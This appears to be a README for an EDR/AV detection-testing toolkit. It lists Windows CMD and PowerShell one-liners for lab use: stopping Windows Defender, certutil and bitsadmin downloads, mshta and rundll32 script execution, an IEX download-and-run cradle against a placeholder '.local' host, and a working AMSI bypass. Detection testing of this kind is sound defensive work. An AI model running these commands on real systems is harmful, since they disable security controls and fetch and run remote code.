# edrtrigger

# EDR Trigger (Non-Malicious Testing)

> [!WARNING]
>
> This set of commands is intended for **non-malicious testing** in a **controlled lab environment only**. These actions may trigger EDR/AV alerts or detections. Although all these are non-malicious and use non-routable TLDs (e.g., `.local`), they should only be executed in production environments if permitted by **compliance policies or explicit exceptions**. Proceed at your own risk.

## CMD

1. **Tasklist Enumeration**  
```cmd
cmd.exe /c tasklist
```

2. **Disabling Windows Defender**  
```cmd
cmd.exe /c sc stop WinDefend
```

3. **Certutil Download**  
```cmd
cmd.exe /c certutil.exe -urlcache -split -f http://7-zip.org/a/7z2405-x64.exe 7zip_installer.exe
```

4. **LOLBAS: Rundll32 (JavaScript Execution)**  
```cmd
cmd.exe /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write('Hello');"
```

5. **Whoami (Enumeration)**  
```cmd
cmd.exe /c whoami > %TEMP%\whoami.txt
```

6. **MSHTA Launching Remote Script**  
```cmd
cmd.exe /c mshta.exe http://edrtest.local/evil.hta
```

7. **BITSAdmin Downloading Payload**  
```cmd
cmd.exe /c bitsadmin /transfer myjob /download /priority high http://edrtest.local/file.exe C:\Users\Public\file.exe
```

## Powershell

1. **Encoded PowerShell**  
```powershell
powershell -EncodedCommand CgpoZWxsbyBlZHI=
```

2. **PowerShell Abuse**  
```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://edrtest.local/ps_script.ps1')"
```

3. **AMSI Bypass**  
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

4. **Malicious Macro Trigger**  
```powershell
Shell("powershell -w hidden -nop -c iex(iwr http://edrtest.local/ps_script.ps1)")
```

5. **COM Abuse (Excel COM Object Execution)**  
```powershell
$xls = New-Object -ComObject Excel.Application; $xls.Visible = $false; $xls.Quit()
```
